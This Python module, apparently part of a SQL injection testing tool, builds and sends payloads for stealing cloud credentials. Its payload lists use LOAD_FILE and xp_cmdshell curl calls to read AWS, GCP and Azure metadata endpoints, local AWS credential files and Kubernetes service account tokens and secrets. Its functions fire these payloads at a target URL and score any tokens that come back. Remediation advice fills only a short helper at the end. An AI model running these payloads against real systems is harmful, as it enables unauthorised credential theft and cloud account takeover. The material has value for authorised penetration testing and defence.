"""
Cloud Metadata Exfiltration Detector

Identifies cloud-hosted environments (AWS, GCP, Azure, Kubernetes) and
generates SQL injection payloads that attempt to access cloud metadata
endpoints.  All operations are read-only by default; no actual credentials
are stored or transmitted to third parties.
"""

import logging
import re
from typing import Any, Dict, List, Optional, Tuple

import requests

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Cloud-specific payload libraries
# ---------------------------------------------------------------------------

AWS_METADATA_PAYLOADS: List[str] = [
    # EC2 Instance Metadata Service (IMDSv1)
    "' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/')--",
    "' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/hostname')--",
    "' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/instance-id')--",
    "' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/public-ipv4')--",
    # RDS credentials via xp_cmdshell (MSSQL)
    "'; EXEC xp_cmdshell 'curl http://169.254.169.254/latest/meta-data/iam/info'--",
    "'; EXEC xp_cmdshell 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default'--",
    # AWS credential files
    "' UNION SELECT LOAD_FILE('/root/.aws/credentials')--",
    "' UNION SELECT LOAD_FILE('/home/ubuntu/.aws/credentials')--",
    "' UNION SELECT LOAD_FILE('/etc/aws-credentials')--",
    # Environment variable leakage via errors
    "' AND EXTRACTVALUE(1,(SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/')))--",
]

GCP_METADATA_PAYLOADS: List[str] = [
    # GCP Compute Engine metadata
    "' UNION SELECT LOAD_FILE('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')--",
    "' UNION SELECT LOAD_FILE('http://metadata.google.internal/computeMetadata/v1/instance/name')--",
    "' UNION SELECT LOAD_FILE('http://metadata.google.internal/computeMetadata/v1/project/project-id')--",
    "' UNION SELECT LOAD_FILE('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email')--",
    # GCP via xp_cmdshell
    "'; EXEC xp_cmdshell 'curl -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'--",
]

AZURE_METADATA_PAYLOADS: List[str] = [
    # Azure IMDS
    "' UNION SELECT LOAD_FILE('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/')--",
    "' UNION SELECT LOAD_FILE('http://169.254.169.254/metadata/instance?api-version=2021-02-01')--",
    "' UNION SELECT LOAD_FILE('http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text')--",
    # Azure via curl
    "'; EXEC xp_cmdshell 'curl -H \"Metadata:true\" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01'--",
]

K8S_SECRETS_PAYLOADS: List[str] = [
    # Kubernetes service account token
    "' UNION SELECT LOAD_FILE('/var/run/secrets/kubernetes.io/serviceaccount/token')--",
    "' UNION SELECT LOAD_FILE('/run/secrets/kubernetes.io/serviceaccount/token')--",
    # CA certificate
    "' UNION SELECT LOAD_FILE('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt')--",
    # Kubernetes namespace
    "' UNION SELECT LOAD_FILE('/var/run/secrets/kubernetes.io/serviceaccount/namespace')--",
    # ConfigMap mounted secrets
    "' UNION SELECT LOAD_FILE('/etc/secrets/database-password')--",
    "' UNION SELECT LOAD_FILE('/var/secrets/api-key')--",
    # Kubernetes API server
    "'; EXEC xp_cmdshell 'curl -k https://kubernetes.default.svc/api/v1/namespaces/default/secrets -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"'--",
]


# ---------------------------------------------------------------------------
# Risk scoring constants
# ---------------------------------------------------------------------------

RISK_CRITICAL = "CRITICAL"
RISK_HIGH = "HIGH"
RISK_MEDIUM = "MEDIUM"
RISK_LOW = "LOW"
RISK_INFO = "INFO"


class CloudEnvironment:
    """Detected cloud environment descriptor."""

    def __init__(
        self,
        provider: str,
        indicators: List[str],
        confidence: float,
        payloads: List[str],
    ) -> None:
        self.provider = provider  # aws | gcp | azure | k8s | unknown
        self.indicators = indicators
        self.confidence = confidence
        self.payloads = payloads


class CloudEscapeDetector:
    """
    Detects cloud-hosted environments and generates targeted SQL injection
    payloads for cloud metadata exfiltration.

    All exploitation is read-only by default (safe_mode=True).
    """

    # Cloud indicator patterns found in error messages / responses
    _CLOUD_INDICATORS: Dict[str, List[str]] = {
        "aws": [
            r"\.amazonaws\.com",
            r"ec2\.internal",
            r"aws_access_key_id",
            r"aws_secret_access_key",
            r"x-amz-",
            r"arn:aws:",
            r"169\.254\.169\.254",
        ],
        "gcp": [
            r"\.googleapis\.com",
            r"metadata\.google\.internal",
            r"gserviceaccount\.com",
            r"google-cloud",
        ],
        "azure": [
            r"\.windows\.net",
            r"\.azure\.com",
            r"\.azurewebsites\.net",
            r"x-ms-",
            r"azure-storage",
        ],
        "k8s": [
            r"kubernetes\.io",
            r"\.svc\.cluster\.local",
            r"serviceaccount",
            r"/var/run/secrets/kubernetes",
        ],
    }

    _PROVIDER_PAYLOADS: Dict[str, List[str]] = {
        "aws": AWS_METADATA_PAYLOADS,
        "gcp": GCP_METADATA_PAYLOADS,
        "azure": AZURE_METADATA_PAYLOADS,
        "k8s": K8S_SECRETS_PAYLOADS,
    }

    def __init__(self, config: Optional[Dict[str, Any]] = None) -> None:
        self.config = config or {}

    # ------------------------------------------------------------------
    # Environment detection
    # ------------------------------------------------------------------

    def detect_cloud_environment(
        self, response_body: str, response_headers: Dict[str, str]
    ) -> CloudEnvironment:
        """
        Identify the cloud provider from HTTP response artefacts.

        Args:
            response_body: HTTP response body text.
            response_headers: HTTP response headers dict.

        Returns:
            CloudEnvironment describing the detected provider.
        """
        combined = response_body + " " + " ".join(
            f"{k}: {v}" for k, v in response_headers.items()
        )

        best_provider = "unknown"
        best_confidence = 0.0
        best_indicators: List[str] = []

        for provider, patterns in self._CLOUD_INDICATORS.items():
            matched: List[str] = []
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    matched.append(pattern)
            confidence = len(matched) / len(patterns)
            if confidence > best_confidence:
                best_confidence = confidence
                best_provider = provider
                best_indicators = matched

        payloads = self._PROVIDER_PAYLOADS.get(best_provider, [])
        return CloudEnvironment(
            provider=best_provider,
            indicators=best_indicators,
            confidence=best_confidence,
            payloads=payloads,
        )

    def detect_by_url(self, url: str) -> CloudEnvironment:
        """Heuristic detection based solely on the target URL."""
        env = self.detect_cloud_environment(url, {})
        return env

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------

    def get_payloads_for_provider(self, provider: str) -> List[str]:
        """Return cloud-specific payloads for a given provider."""
        return list(self._PROVIDER_PAYLOADS.get(provider.lower(), []))

    def get_all_payloads(self) -> List[str]:
        """Return all cloud metadata payloads across providers."""
        payloads: List[str] = []
        for p_list in self._PROVIDER_PAYLOADS.values():
            payloads.extend(p_list)
        return payloads

    # ------------------------------------------------------------------
    # Risk scoring
    # ------------------------------------------------------------------

    def score_finding(
        self,
        response_body: str,
        provider: str,
    ) -> Tuple[str, str]:
        """
        Assign a risk score to an identified cloud metadata finding.

        Args:
            response_body: Response text from the injection attempt.
            provider: Detected cloud provider.

        Returns:
            Tuple of (risk_level, reason).
        """
        body_lower = response_body.lower()

        # AWS credential indicators
        if re.search(r"aws_access_key_id|accesskeyid|secretaccesskey", body_lower):
            return RISK_CRITICAL, "AWS IAM credentials detected in response"

        # GCP token
        if re.search(r'"access_token"\s*:', body_lower):
            return RISK_CRITICAL, "GCP OAuth access token detected in response"

        # Azure token
        if re.search(r'"access_token"\s*:', body_lower) and "azure" in provider:
            return RISK_CRITICAL, "Azure managed identity token detected in response"

        # K8s service account token (JWT pattern)
        if re.search(r"eyj[a-z0-9+/=_.\-]{20,}", body_lower, re.IGNORECASE):
            return RISK_HIGH, "Kubernetes JWT service account token detected"

        # Cloud metadata readable but no creds
        if re.search(
            r"169\.254\.169\.254|metadata\.google\.internal|instance-id|project-id",
            body_lower,
        ):
            return RISK_MEDIUM, "Cloud instance metadata accessible but no credentials extracted"

        # Generic cloud header leakage
        if re.search(r"x-amz-|x-ms-|x-goog-", body_lower):
            return RISK_LOW, "Cloud provider headers detected in response"

        return RISK_INFO, "No cloud credential data found"

    # ------------------------------------------------------------------
    # Metadata endpoint accessibility test
    # ------------------------------------------------------------------

    def test_metadata_accessibility(
        self, target_url: str, provider: str, safe_mode: bool = True
    ) -> Dict[str, Any]:
        """
        Send targeted cloud metadata payloads to ``target_url`` and report
        the accessibility status.

        Args:
            target_url: Target URL for SQL injection testing.
            provider: Cloud provider to test payloads for.
            safe_mode: If True, only test first 3 payloads.

        Returns:
            Dict with keys: provider, accessible, findings, risk_level.
        """
        payloads = self.get_payloads_for_provider(provider)
        if safe_mode:
            payloads = payloads[:3]

        findings: List[Dict[str, Any]] = []
        accessible = False

        for payload in payloads:
            try:
                resp = requests.get(
                    target_url,
                    params={"id": payload},
                    timeout=self.config.get("timeout", 10),
                    allow_redirects=False,
                )
                body = resp.text
                risk_level, reason = self.score_finding(body, provider)

                if risk_level in (RISK_CRITICAL, RISK_HIGH, RISK_MEDIUM):
                    accessible = True
                    findings.append(
                        {
                            "payload": payload,
                            "risk_level": risk_level,
                            "reason": reason,
                            "response_snippet": body[:500],
                        }
                    )
            except Exception as exc:
                logger.debug("Cloud escape test failed: %s", exc)

        return {
            "provider": provider,
            "accessible": accessible,
            "findings": findings,
            "risk_level": findings[0]["risk_level"] if findings else RISK_INFO,
        }

    # ------------------------------------------------------------------
    # Full assessment
    # ------------------------------------------------------------------

    def assess_target(
        self,
        target_url: str,
        safe_mode: bool = True,
    ) -> Dict[str, Any]:
        """
        Run a complete cloud escape assessment against ``target_url``.

        Args:
            target_url: Target URL.
            safe_mode: Limit payloads for safety.

        Returns:
            Assessment report dict.
        """
        # Probe to get initial response for environment detection
        env = self.detect_by_url(target_url)

        # If we can reach the URL, use full response for detection
        try:
            resp = requests.get(
                target_url,
                timeout=self.config.get("timeout", 10),
                allow_redirects=False,
            )
            env = self.detect_cloud_environment(resp.text, dict(resp.headers))
        except Exception:
            pass

        providers_to_test = (
            [env.provider] if env.provider != "unknown" else list(self._PROVIDER_PAYLOADS.keys())
        )

        results: List[Dict[str, Any]] = []
        for provider in providers_to_test:
            result = self.test_metadata_accessibility(target_url, provider, safe_mode=safe_mode)
            results.append(result)

        overall_risk = RISK_INFO
        risk_order = [RISK_CRITICAL, RISK_HIGH, RISK_MEDIUM, RISK_LOW, RISK_INFO]
        for result in results:
            rl = result.get("risk_level", RISK_INFO)
            if risk_order.index(rl) < risk_order.index(overall_risk):
                overall_risk = rl

        return {
            "target": target_url,
            "detected_environment": env.provider,
            "cloud_confidence": env.confidence,
            "cloud_indicators": env.indicators,
            "provider_results": results,
            "overall_risk_level": overall_risk,
            "recommendations": self._recommendations(overall_risk),
        }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _recommendations(risk_level: str) -> List[str]:
        base = [
            "Disable LOAD_FILE privilege for database users.",
            "Enable IMDSv2 (AWS) or equivalent to require session tokens for metadata access.",
            "Restrict outbound HTTP from database server processes.",
            "Store credentials in a secrets manager, not as files or environment variables.",
        ]
        if risk_level == RISK_CRITICAL:
            base.insert(0, "URGENT: Rotate all exposed cloud credentials immediately.")
        return base
